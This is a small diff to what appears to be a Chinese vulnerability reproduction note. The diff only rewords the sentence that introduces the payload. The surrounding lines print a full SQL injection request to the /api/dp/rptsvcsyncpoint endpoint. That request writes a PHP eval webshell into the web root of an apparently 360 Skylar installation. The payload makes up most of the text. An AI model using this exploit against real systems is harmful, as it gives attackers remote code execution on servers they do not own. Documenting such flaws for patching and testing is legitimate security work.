@@ -14,7 +14,7 @@
 暂无
 
 # 0x04 漏洞复现
-如下时写入Webshell的payload
+写入Webshell的payload如下：
 ```
 /api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--
 ```
